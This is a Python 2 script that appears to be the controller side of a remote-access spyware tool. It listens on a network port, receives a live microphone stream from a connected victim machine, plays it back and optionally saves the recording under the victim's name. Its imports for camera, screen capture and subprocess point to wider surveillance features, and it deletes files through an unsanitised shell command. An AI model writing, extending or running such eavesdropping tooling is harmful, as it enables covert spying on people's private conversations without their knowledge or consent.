#!/usr/bin/python
import socket
import sys
import getpass
import os
import time
import pyaudio
import pygame.camera
import pygame.image
import wave
import cv2
import numpy
import subprocess
import pyscreenshot as ImageGrab
import re
from threading import Thread

def MicrophoneThread(cmd,BURST,HOST,PORT,BYTES,CURRENT_CLIENT):
  try:
    PORT=int(PORT)
    BYTES=int(BYTES)
    BURST=int(BURST)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT+3))
    s.listen(1)
  
    print "LISTEN : ",HOST,PORT+3
    con, addr = s.accept()
    print "GOT : ",addr
    
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 4096
    WAVE_OUTPUT_FILENAME = CURRENT_CLIENT+" "+time.strftime("%Y-%m-%d %H-%M-%S", time.localtime())
    audio = pyaudio.PyAudio()
    stream = audio.open(format = FORMAT,channels=CHANNELS,rate=RATE,output=True)

    if '1' in cmd:
      waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
      waveFile.setnchannels(CHANNELS)
      waveFile.setsampwidth(audio.get_sample_size(FORMAT))
      waveFile.setframerate(RATE)  
    frames = []
    st=0
    cur=0
    while True:
      data = con.recv(CHUNK)
      while len(data)<CHUNK:
        data+=con.recv(CHUNK-len(data))          
      cur = cur + 1
      if '1' in cmd:
        waveFile.writeframes(data)
      frames.append(data)
      if cur-st == BURST:
        for i in range(st,cur):
          stream.write(frames[i])
        st=cur
  except:
    con.send('close microphone')
    print('Shutting down')
    stream.close()
    audio.terminate()
    if '1' in cmd:
      waveFile.close()          
    chunk = ''
    while True:
      chunk += con.recv(BYTES)
      if 'finished\n' in chunk[-9:]:
        break
    if '1' in cmd:
      cmd=raw_input('Wanna Keep Recording?(y/n)')
    else:
      cmd='y'
    if(cmd=='n'):
      cmd=subprocess.Popen("rm '"+WAVE_OUTPUT_FILENAME+"'",shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
      output=cmd.stdout.read()+cmd.stderr.read()
      print output
    return
try:
  MicrophoneThread(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5],sys.argv[6])
except Exception,e:
  print "Exception :",e

